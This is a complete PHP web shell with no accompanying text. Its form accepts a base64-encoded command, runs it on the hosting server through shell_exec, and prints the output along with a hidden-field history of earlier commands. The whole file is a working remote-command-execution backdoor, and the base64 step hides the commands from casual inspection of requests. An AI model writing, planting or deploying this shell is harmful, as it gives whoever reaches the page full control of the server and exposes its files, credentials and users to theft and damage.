<?php
$h='';$c='whoami';
if(isset($_POST['c']))$c=base64_decode($_POST['c']);
if(isset($_POST['h']))$h=base64_decode($_POST['h']);
$h=$c."\n".$h;
?><form method=post onsubmit="this.c.value=btoa(this.c.value)"><input name=c placeholder=command autofocus autocomplete=off><input name=h type=hidden value="<?php echo base64_encode($h);?>"><button>Run</button></form><?php
$o=shell_exec($c." 2>&1");
echo"<pre><textarea readonly>".htmlspecialchars($h)."</textarea></pre><hr><pre>".htmlspecialchars($o)."</pre>";
